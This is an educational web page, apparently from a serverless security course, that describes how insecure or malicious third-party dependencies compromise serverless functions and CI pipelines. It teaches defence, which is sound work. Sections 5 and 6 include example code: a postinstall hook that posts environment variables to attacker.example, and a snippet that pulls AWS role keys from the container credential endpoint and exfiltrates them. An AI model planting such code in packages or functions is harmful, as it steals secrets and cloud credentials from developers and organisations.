@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SAS-6: Insecure Third-Party Dependencies - Attack Vectors</title>
+    <link rel="stylesheet" href="/platform/frontend/js/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .doc-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+
+        .back-nav:hover {
+            background-color: rgba(245, 158, 11, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 40px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(245, 158, 11, 0.1);
+        }
+
+        .content h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            text-shadow: none;
+        }
+
+        .content h2 {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .content h3 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 12px;
+        }
+
+        .content h4 {
+            color: var(--secondary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .content p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .content ul, .content ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .content li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .content code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', monospace;
+            border: 1px solid var(--border-color);
+        }
+
+        .content pre {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--primary-color);
+        }
+
+        .content blockquote {
+            border-left: 4px solid var(--primary-color);
+            padding-left: 20px;
+            margin: 20px 0;
+            background: rgba(245, 158, 11, 0.05);
+            padding: 15px 20px;
+            border-radius: 4px;
+        }
+
+        .content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table th {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(251, 191, 36, 0.2));
+            color: var(--primary-color);
+            padding: 12px;
+            text-align: left;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table td {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+
+        .content table tr:hover {
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        .content a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .content a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .content strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+
+        .toc {
+            background: rgba(245, 158, 11, 0.05);
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .toc h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc a:hover {
+            color: var(--primary-color);
+        }
+
+        .toc a:before {
+            content: "▸";
+            color: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="doc-container">
+        <a href="/learn/serverless" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back
+        </a>
+
+        <div class="content">
+            <h1>SAS-6: Insecure Third-Party Dependencies - Attack Vectors</h1>
+
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding">Understanding Dependency Attack Vectors</a></li>
+<li><a href="#core-attack-flow">Core Attack Flow</a></li>
+<li><a href="#common-attack-patterns">Common Attack Patterns</a></li>
+<li><a href="#chaining">Chaining with Over-Privileged Roles</a></li>
+</ul>
+</div>
+
+<h2 id="understanding">Understanding Dependency Attack Vectors</h2>
+
+<blockquote>
+<p><strong>&#9888;&#65039; EDUCATIONAL PURPOSE ONLY</strong> &mdash; the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.</p>
+</blockquote>
+
+<p>Dependency attacks come in two shapes. In the <strong>known-vulnerable</strong> shape, the attacker does nothing to your supply chain&mdash;they simply notice that a library you already ship has a public advisory, and they send input that triggers it. In the <strong>malicious-package</strong> shape, the attacker gets their own code into your tree (typosquat, hijack, confusion) so that it runs the moment your function imports it. Both end in the same place: attacker-influenced code executing inside your function, with your function's identity.</p>
+
+<p>The serverless amplifier is <strong>ambient credentials</strong>. Any code in the process can read the environment and the container credential endpoint, so the distance from "arbitrary code runs" to "the account's keys are exfiltrated" is a single line.</p>
+
+<h3 id="core-attack-flow">Core Attack Flow</h3>
+
+<pre><code>1. Get code into the function
+   &darr;
+   Known CVE in a bundled dep, OR a malicious/typosquatted/hijacked package
+2. Execute in the function's context
+   &darr;
+   At import, via an install script, or when the vulnerable path is triggered
+3. Harvest ambient credentials
+   &darr;
+   Read env vars + the container credential endpoint -> role's temporary keys
+4. Pivot / exfiltrate
+   &darr;
+   Use the (often over-privileged) role to reach S3, DynamoDB, other roles</code></pre>
+
+<h2 id="common-attack-patterns">Common Attack Patterns</h2>
+
+<h3>1. Exploiting a Known CVE in a Bundled Dependency</h3>
+
+<p>The attacker fingerprints a library you ship (an error message, a response header, a behavioural quirk, or just a leaked bundle) and sends input that reaches the vulnerable code path.</p>
+
+<pre><code># A function bundles a parser/deserializer with a public advisory.
+# The attacker crafts an event that reaches the vulnerable code path:
+POST /ingest
+Content-Type: application/json
+
+{ "payload": "&lt;crafted input that triggers the known CVE&gt;" }
+
+# The library processes it and the attacker gains code execution
+# INSIDE the function's process.</code></pre>
+
+<p><strong>Payoff</strong>: remote code execution using nothing but a published advisory and your unpatched version. No supply-chain access required.</p>
+
+<h3>2. Typosquatting a Package Name</h3>
+
+<p>A developer (or a generated manifest) mistypes a name, and an attacker-owned lookalike is installed instead.</p>
+
+<pre><code># Intended:
+npm install cross-env
+# Mistyped -> attacker's lookalike:
+npm install crossenv        # ships credential-stealing code
+
+# Python equivalents seen in the wild:
+pip install reqeusts        # vs. requests
+pip install python-sqlite   # vs. the stdlib / real packages</code></pre>
+
+<p><strong>Payoff</strong>: attacker code enters the build and the artifact; it typically runs immediately via an install script and again at runtime.</p>
+
+<h3>3. Dependency Confusion (Internal Name on the Public Registry)</h3>
+
+<p>An attacker publishes a package with your <em>internal</em> package's name, at a higher version, on the public registry. A misconfigured resolver prefers the public copy.</p>
+
+<pre><code># Your private package:
+@myco/auth-utils   internal version 1.4.0
+
+# Attacker publishes on the PUBLIC registry:
+@myco/auth-utils   version 99.0.0   (malicious)
+
+# A build that checks the public registry first pulls 99.0.0
+# because it is "newer".</code></pre>
+
+<p><strong>Payoff</strong>: the attacker's package is installed in place of your trusted internal one, executing on the build host and in the function.</p>
+
+<h3>4. Maintainer / Account Hijack of a Popular Package</h3>
+
+<p>The attacker takes over a legitimate package (phished credentials, an abandoned but still-depended-on library, a "helpful" new co-maintainer) and pushes a malicious release&mdash;often hidden in a fresh transitive dependency.</p>
+
+<pre><code># You depend on "widely-used-lib" and never changed your range:
+"widely-used-lib": "^2.0.0"
+
+# The hijacked maintainer publishes 2.3.1, which adds a new transitive dep
+# "innocuous-helper" that contains the payload.
+# Your next `npm install` (no lockfile) silently pulls it in.</code></pre>
+
+<p><strong>Payoff</strong>: a single upstream compromise propagates to every downstream function on the next unpinned install.</p>
+
+<h3>5. Malicious Install-Time Script (postinstall)</h3>
+
+<p>Package managers run lifecycle scripts during installation. Attacker code executes on the build/deploy host&mdash;before anything is deployed.</p>
+
+<pre><code>// attacker package.json
+{
+  "name": "helper-utils",
+  "scripts": {
+    "postinstall": "node ./harvest.js"   // runs on `npm install`
+  }
+}
+
+// harvest.js (illustrative): exfiltrate whatever the CI host exposes
+require('https').request('https://attacker.example/c', { method: 'POST' })
+  .end(JSON.stringify(process.env));      // CI secrets, tokens, deploy creds</code></pre>
+
+<p><strong>Payoff</strong>: compromise of the CI/CD pipeline and its secrets, and the ability to tamper with the artifact that gets deployed.</p>
+
+<h3>6. Runtime Credential Exfiltration from Inside the Function</h3>
+
+<p>Once a malicious module is imported, it reads the ambient credentials every serverless runtime exposes.</p>
+
+<pre><code>// Runs at import time inside the deployed Lambda:
+const creds = {
+  env: process.env,                         // AWS_SESSION_TOKEN, secrets, etc.
+};
+// The container credentials endpoint yields the role's temporary keys:
+fetch(process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+      ? 'http://169.254.170.2' + process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+      : '...')
+  .then(r =&gt; r.json())
+  .then(k =&gt; fetch('https://attacker.example/x', {
+      method: 'POST', body: JSON.stringify({ creds, keys: k }) }));</code></pre>
+
+<p><strong>Payoff</strong>: the function's temporary role credentials and all its environment secrets land at the attacker's endpoint&mdash;no CVE needed, just presence in the tree.</p>
+
+<h3>7. Vulnerable Library Bundled in a Shared Lambda Layer</h3>
+
+<p>Layers are convenient and therefore stale. One vulnerable library in a shared layer exposes every function attached to it.</p>
+
+<pre><code># Layer "common-deps:7" bundles an old serialization library with a CVE.
+# 40 functions attach the layer:
+functionA -&gt; layer common-deps:7  (vulnerable)
+functionB -&gt; layer common-deps:7  (vulnerable)
+...
+# One exploit works against all of them; the layer is rarely rebuilt.</code></pre>
+
+<p><strong>Payoff</strong>: fleet-wide exploitation from a single unscanned, stale artifact.</p>
+
+<h3>8. Outdated Runtime with Unpatched CVEs</h3>
+
+<p>A function pinned to a deprecated language runtime carries runtime-level vulnerabilities that will never be patched under it.</p>
+
+<pre><code>Runtime: nodejs14.x   # deprecated / end of support
+Runtime: python3.7    # end of support
+# Provider stops patching the runtime; every function on it inherits
+# whatever CVEs exist at that level.</code></pre>
+
+<p><strong>Payoff</strong>: durable, un-patchable exposure until the function is migrated to a supported runtime.</p>
+
+<h3>9. Trojanized Update to a Low-Attention Transitive Dep</h3>
+
+<p>The target is not the package you know, but a small utility three levels down that nobody watches.</p>
+
+<pre><code>your-app
+  &rarr; framework
+      &rarr; formatter
+          &rarr; tiny-string-util   &lt;-- hijacked; new release adds payload
+# You never named tiny-string-util; a floating range pulled the bad version.</code></pre>
+
+<p><strong>Payoff</strong>: the deepest, least-audited node in the tree is the easiest to poison and the hardest to notice.</p>
+
+<h2 id="chaining">Chaining with Over-Privileged Roles</h2>
+
+<p>A dependency compromise is only as damaging as the identity it inherits. In serverless that identity is the execution role, and the chain that turns a single bad package into an account breach is short:</p>
+
+<pre><code>Malicious transitive package imported in the function
+        +
+Function role has broad permissions (SAS-4: e.g. s3:*, iam:*, sts:AssumeRole)
+        =
+Package reads the role's temp keys at runtime
+        -&gt; lists and downloads S3 buckets
+        -&gt; scans DynamoDB tables
+        -&gt; assumes other roles and pivots across the account</code></pre>
+
+<p>Another common chain, starting at build time:</p>
+
+<pre><code>postinstall script runs in CI (malicious dep)
+        -&gt; steals the pipeline's deploy credentials from the environment
+        -&gt; those credentials can deploy/modify functions
+        -&gt; attacker backdoors the artifact for EVERY future deploy</code></pre>
+
+<p>The defensive lesson is that <strong>SAS-6 and SAS-4 are multiplicative</strong>: minimizing and scanning dependencies reduces the chance of a compromise; least-privilege roles and monitored egress reduce what a compromise can do.</p>
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>Two ways in, one destination</strong>&mdash;known CVEs and malicious packages both end in attacker code running with your function's identity.</li>
+<li><strong>Transitive and install-time are the blind spots</strong>&mdash;the code you never named, running before you even deploy, is where these attacks live.</li>
+<li><strong>Credentials are ambient</strong>&mdash;any imported module can read env vars and the container credential endpoint; RCE and exfiltration are one step apart.</li>
+<li><strong>Layers and stale runtimes multiply exposure</strong>&mdash;one vulnerable shared artifact exploits an entire fleet.</li>
+<li><strong>Blast radius is set by the role</strong>&mdash;chaining with SAS-4 turns a single bad dependency into full account compromise.</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.html">Prevention Guide</a></strong>: Inventory, scan, pin, minimize, and least-privilege</li>
+<li><strong><a href="examples.html">Code Examples</a></strong>: Vulnerable vs. secure package config, lockfiles, CI, and layers</li>
+<li><strong><a href="/learn/serverless">Serverless Learning Path</a></strong>: Continue the OWASP Serverless Top 10</li>
+<li><strong><a href="/practice">Practice</a></strong>: Apply what you've learned in hands-on exercises</li>
+</ul>
+
+        </div>
+    </div>
+</body>
+</html>
